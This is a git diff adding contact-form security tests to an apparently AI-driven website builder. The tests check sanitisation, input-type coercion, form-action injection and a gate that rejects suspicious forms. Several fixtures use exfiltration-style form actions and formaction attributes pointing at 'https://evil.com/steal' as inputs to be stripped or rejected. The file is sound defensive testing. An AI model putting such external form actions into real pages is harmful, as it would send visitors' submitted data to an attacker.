@@ -1370,3 +1370,166 @@ const plUser = buildPlannerUserMessage(bpSum, 'hero bölümünü koyulaştır')
 assert.ok(plUser.includes('b1') && plUser.includes('hero bölümünü koyulaştır'), `FAIL BPV8: planner user message must carry the block list + the command`)
 
 console.log('block-patch OK')
+
+// ---------------------------------------------------------------------------
+// CONTACT-FORM section — the working contact form (#3)
+//
+// Asserts the FULL security boundary of the form widening:
+//   (CF-S) sanitize: <form data-yoai-form> + text/email/tel inputs + <textarea>
+//          SURVIVE; password/file/hidden/image inputs are COERCED to type=text;
+//          native action/method/onsubmit/formaction are STRIPPED; the honeypot
+//          (type=text) survives; data-yoai-form-action survives (serving sets it).
+//   (CF-A) assembleDocument: rewriteFormAction injects data-yoai-form-action in
+//          serve mode (formActionBase) and NOT in preview (no formActionBase).
+//   (CF-G) gate: a page with a sensitive input OR an external form action/formaction
+//          → ok:false (suspicious_form); the safe contact form PASSES.
+// ---------------------------------------------------------------------------
+
+// Re-grab the form-action rewrite from the assemble core (assembleDocument core
+// already imported above as assembleDocumentPath).
+const { rewriteFormAction } = await import(assembleDocumentPath)
+
+// A canonical, safe contact form exactly as the prompt instructs the model to emit.
+const safeForm =
+  '<form data-yoai-form class="grid gap-4">' +
+  '<label for="cf-name">Ad</label>' +
+  '<input type="text" name="name" id="cf-name" required placeholder="Adınız" autocomplete="name" class="border">' +
+  '<label for="cf-email">E-posta</label>' +
+  '<input type="email" name="email" id="cf-email" required placeholder="E-posta" autocomplete="email" class="border">' +
+  '<label for="cf-phone">Telefon</label>' +
+  '<input type="tel" name="phone" id="cf-phone" placeholder="Telefon" autocomplete="tel" class="border">' +
+  '<label for="cf-msg">Mesaj</label>' +
+  '<textarea name="message" id="cf-msg" required rows="4" placeholder="Mesajınız" class="border"></textarea>' +
+  '<input type="text" name="company" tabindex="-1" autocomplete="off" aria-hidden="true" class="absolute -left-[9999px] opacity-0" data-yoai-honeypot>' +
+  '<button type="submit" class="bg-[var(--accent)]">Gönder</button>' +
+  '<div data-yoai-form-success hidden>Teşekkürler.</div>' +
+  '<div data-yoai-form-error hidden>Hata.</div>' +
+  '</form>'
+
+// CF-S1 — the safe form + its allowed fields SURVIVE sanitize.
+const cfs = sanitizeSiteHtml(safeForm)
+assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfs), `FAIL CF-S1: <form data-yoai-form> stripped — got: ${cfs}`)
+assert.ok(/<input\b[^>]*type="text"[^>]*name="name"/i.test(cfs) || /<input\b[^>]*name="name"[^>]*type="text"/i.test(cfs), `FAIL CF-S1: text name input dropped — got: ${cfs}`)
+assert.ok(/<input\b[^>]*type="email"/i.test(cfs), `FAIL CF-S1: email input dropped — got: ${cfs}`)
+assert.ok(/<input\b[^>]*type="tel"/i.test(cfs), `FAIL CF-S1: tel input dropped — got: ${cfs}`)
+assert.ok(/<textarea\b[^>]*name="message"/i.test(cfs), `FAIL CF-S1: <textarea> dropped — got: ${cfs}`)
+assert.ok(/<button\b[^>]*type="submit"/i.test(cfs), `FAIL CF-S1: submit button dropped — got: ${cfs}`)
+assert.ok(cfs.includes('data-yoai-honeypot'), `FAIL CF-S1: honeypot input dropped — got: ${cfs}`)
+assert.ok(/\brequired\b/i.test(cfs), `FAIL CF-S1: required attribute dropped — got: ${cfs}`)
+assert.ok(cfs.includes('data-yoai-form-success'), `FAIL CF-S1: success element dropped — got: ${cfs}`)
+assert.ok(cfs.includes('data-yoai-form-error'), `FAIL CF-S1: error element dropped — got: ${cfs}`)
+
+// CF-S2 — FORBIDDEN input types are COERCED to type=text (never allowed through).
+const cfPwd = sanitizeSiteHtml('<input type="password" name="pw">')
+assert.ok(!/type="password"/i.test(cfPwd), `FAIL CF-S2: type=password not coerced — got: ${cfPwd}`)
+assert.ok(/type="text"/i.test(cfPwd), `FAIL CF-S2: coerced input must become type=text — got: ${cfPwd}`)
+const cfFile = sanitizeSiteHtml('<input type="file" name="f">')
+assert.ok(!/type="file"/i.test(cfFile), `FAIL CF-S2: type=file not coerced — got: ${cfFile}`)
+const cfHidden = sanitizeSiteHtml('<input type="hidden" name="h" value="x">')
+assert.ok(!/type="hidden"/i.test(cfHidden), `FAIL CF-S2: type=hidden not coerced — got: ${cfHidden}`)
+assert.ok(/type="text"/i.test(cfHidden), `FAIL CF-S2: hidden must coerce to text — got: ${cfHidden}`)
+const cfImage = sanitizeSiteHtml('<input type="image" src="https://evil/x.png" name="i">')
+assert.ok(!/type="image"/i.test(cfImage), `FAIL CF-S2: type=image not coerced — got: ${cfImage}`)
+// also a few more forbidden types coerce to text
+for (const bad of ['submit', 'button', 'checkbox', 'radio', 'number', 'url', 'date', 'color', 'range']) {
+  const out = sanitizeSiteHtml(`<input type="${bad}" name="x">`)
+  assert.ok(!new RegExp(`type="${bad}"`, 'i').test(out), `FAIL CF-S2: type=${bad} not coerced — got: ${out}`)
+  assert.ok(/type="text"/i.test(out), `FAIL CF-S2: type=${bad} must coerce to text — got: ${out}`)
+}
+
+// CF-S3 — native form/input submit surfaces are STRIPPED.
+const cfActions = sanitizeSiteHtml(
+  '<form data-yoai-form action="https://evil.com/steal" method="post" onsubmit="x()" target="_blank" name="f">' +
+  '<input type="text" name="name" formaction="https://evil.com/x">' +
+  '<button type="submit" formaction="https://evil.com/y">Go</button>' +
+  '</form>',
+)
+assert.ok(!/\saction=/i.test(cfActions), `FAIL CF-S3: form action not stripped — got: ${cfActions}`)
+assert.ok(!/\smethod=/i.test(cfActions), `FAIL CF-S3: form method not stripped — got: ${cfActions}`)
+assert.ok(!/\starget=/i.test(cfActions), `FAIL CF-S3: form target not stripped — got: ${cfActions}`)
+assert.ok(!/onsubmit/i.test(cfActions), `FAIL CF-S3: onsubmit not stripped — got: ${cfActions}`)
+assert.ok(!/formaction/i.test(cfActions), `FAIL CF-S3: formaction not stripped — got: ${cfActions}`)
+// the form itself + its safe text input survive (only the dangerous attrs are gone)
+assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfActions), `FAIL CF-S3: form tag must survive (only attrs stripped) — got: ${cfActions}`)
+assert.ok(/<input\b[^>]*type="text"/i.test(cfActions), `FAIL CF-S3: safe input must survive — got: ${cfActions}`)
+
+// CF-S4 — data-yoai-form-action (set by the serving layer) survives sanitize.
+const cfFA = sanitizeSiteHtml('<form data-yoai-form data-yoai-form-action="/s/acme/lead"><input type="text" name="name"></form>')
+assert.ok(cfFA.includes('data-yoai-form-action="/s/acme/lead"'), `FAIL CF-S4: data-yoai-form-action stripped — got: ${cfFA}`)
+
+// CF-A1 — rewriteFormAction: serve mode injects data-yoai-form-action; preview does not.
+const rwForm = rewriteFormAction('<form data-yoai-form class="x"><input type="text" name="name"></form>', '/s/acme/lead')
+assert.ok(rwForm.includes('data-yoai-form-action="/s/acme/lead"'), `FAIL CF-A1: action not injected in serve — got: ${rwForm}`)
+assert.ok(rwForm.includes('class="x"'), `FAIL CF-A1: existing attrs must be preserved — got: ${rwForm}`)
+// empty/undefined base → no-op (preview/thumb → optimistic success)
+assert.strictEqual(rewriteFormAction('<form data-yoai-form></form>', ''), '<form data-yoai-form></form>', `FAIL CF-A1: empty base must be a no-op`)
+assert.strictEqual(rewriteFormAction('<form data-yoai-form></form>', undefined), '<form data-yoai-form></form>', `FAIL CF-A1: undefined base must be a no-op`)
+// idempotent: a pre-existing action is replaced, not duplicated
+const rwTwice = rewriteFormAction(rwForm, '/s/acme/lead')
+assert.strictEqual((rwTwice.match(/data-yoai-form-action=/g) || []).length, 1, `FAIL CF-A1: action must not be duplicated on re-rewrite — got: ${rwTwice}`)
+
+// CF-A2 — assembleDocument serve mode (formActionBase) injects the action;
+// preview mode (no formActionBase) leaves the form action-less.
+const cfServeDoc = await assembleDocument({
+  bodyHtml: '<header><nav></nav></header><main><h1>İletişim</h1>' + safeForm + '</main><footer>f</footer>',
+  designVars: {},
+  seo: { title: 'İletişim' },
+  lang: 'tr',
+  fontHref: null,
+  mode: 'serve',
+  formActionBase: '/s/acme/lead',
+})
+assert.ok(cfServeDoc.includes('data-yoai-form-action="/s/acme/lead"'), `FAIL CF-A2: serve assembleDocument must inject the lead action`)
+assert.ok(cfServeDoc.includes('<form') && /name="name"/.test(cfServeDoc), `FAIL CF-A2: form must survive assemble`)
+
+const cfPreviewDoc = await assembleDocument({
+  bodyHtml: '<header><nav></nav></header><main><h1>İletişim</h1>' + safeForm + '</main><footer>f</footer>',
+  designVars: {},
+  seo: { title: 'İletişim' },
+  lang: 'tr',
+  fontHref: null,
+  mode: 'preview',
+  // no formActionBase → optimistic preview (no real send)
+})
+// NOTE: preview INLINES the runtime, whose behavior-contract comment mentions the
+// string 'data-yoai-form-action' — so we must assert the <form> TAG itself carries
+// no action attribute, not merely that the substring is absent from the document.
+const cfPreviewFormTag = (cfPreviewDoc.match(/<form\b[^>]*>/i) || [''])[0]
+assert.ok(!/data-yoai-form-action/i.test(cfPreviewFormTag), `FAIL CF-A2: preview <form> must NOT carry a form action (optimistic) — got tag: ${cfPreviewFormTag}`)
+
+// CF-G1 — the SAFE contact form passes the gate (no suspicious_form, valid structure).
+const cfGateSafe = gateSiteHtml('<header><nav></nav></header><main><h1>İletişim</h1>' + safeForm + '</main><footer>f</footer>')
+assert.ok(cfGateSafe.ok === true, `FAIL CF-G1: safe contact form must pass the gate — got: ${JSON.stringify(cfGateSafe)}`)
+assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfGateSafe.html), `FAIL CF-G1: gated html must keep the safe form — got: ${cfGateSafe.html}`)
+
+// CF-G2 — a page with a type=password input is REJECTED (suspicious_form).
+const cfGatePwd = gateSiteHtml('<header><nav></nav></header><main><h1>Giriş</h1><form data-yoai-form><input type="password" name="pw"></form></main><footer>f</footer>')
+assert.ok(cfGatePwd.ok === false, `FAIL CF-G2: password input must fail the gate — got: ${JSON.stringify(cfGatePwd)}`)
+assert.ok(!cfGatePwd.ok && cfGatePwd.reason === 'suspicious_form', `FAIL CF-G2: reason must be suspicious_form — got: ${JSON.stringify(cfGatePwd)}`)
+
+// CF-G2b — type=file and type=hidden also fail.
+assert.strictEqual(gateSiteHtml('<main><h1>x</h1><input type="file" name="f"></main>').reason, 'suspicious_form', `FAIL CF-G2b: type=file must fail with suspicious_form`)
+assert.strictEqual(gateSiteHtml('<main><h1>x</h1><input type="hidden" name="h"></main>').reason, 'suspicious_form', `FAIL CF-G2b: type=hidden must fail with suspicious_form`)
+
+// CF-G3 — a form with an EXTERNAL native action is REJECTED (suspicious_form).
+const cfGateAction = gateSiteHtml('<header><nav></nav></header><main><h1>x</h1><form action="https://evil.com/steal" method="post"><input type="text" name="name"></form></main><footer>f</footer>')
+assert.ok(cfGateAction.ok === false && cfGateAction.reason === 'suspicious_form', `FAIL CF-G3: external form action must fail with suspicious_form — got: ${JSON.stringify(cfGateAction)}`)
+// formaction on a submit control also fails
+const cfGateFormAction = gateSiteHtml('<main><h1>x</h1><form data-yoai-form><button type="submit" formaction="https://evil.com/x">Go</button></form></main>')
+assert.ok(cfGateFormAction.ok === false && cfGateFormAction.reason === 'suspicious_form', `FAIL CF-G3: formaction must fail with suspicious_form — got: ${JSON.stringify(cfGateFormAction)}`)
+
+// CF-G4 — the gate's data-yoai-form-action (hyphenated) must NOT trip the formaction check
+// (it is the safe declarative hook, not a native formaction). Belt-and-suspenders.
+const cfGateHook = gateSiteHtml('<header><nav></nav></header><main><h1>x</h1><form data-yoai-form data-yoai-form-action="/s/acme/lead"><input type="text" name="name"></form></main><footer>f</footer>')
+assert.ok(cfGateHook.ok === true, `FAIL CF-G4: data-yoai-form-action must NOT be mistaken for a native formaction — got: ${JSON.stringify(cfGateHook)}`)
+
+// CF-P1 — the generation prompt now instructs a FUNCTIONAL form (data-yoai-form +
+// the field set) and STILL forbids credentials/payment/upload.
+const cfSys = buildHtmlSystemPrompt()
+assert.ok(cfSys.includes('data-yoai-form'), `FAIL CF-P1: prompt must instruct <form data-yoai-form>`)
+assert.ok(/name="name"/.test(cfSys) && /type="email"/.test(cfSys) && /type="tel"/.test(cfSys) && /textarea/.test(cfSys), `FAIL CF-P1: prompt must describe the name/email/phone/message fields`)
+assert.ok(/honeypot/i.test(cfSys) && /name="company"/.test(cfSys), `FAIL CF-P1: prompt must describe the honeypot`)
+assert.ok(/data-yoai-form-success/.test(cfSys), `FAIL CF-P1: prompt must describe the success element`)
+assert.ok(/password/i.test(cfSys) && /payment|checkout/i.test(cfSys) && /upload|file/i.test(cfSys), `FAIL CF-P1: prompt must still forbid password/payment/upload`)
+
+console.log('contact-form OK')
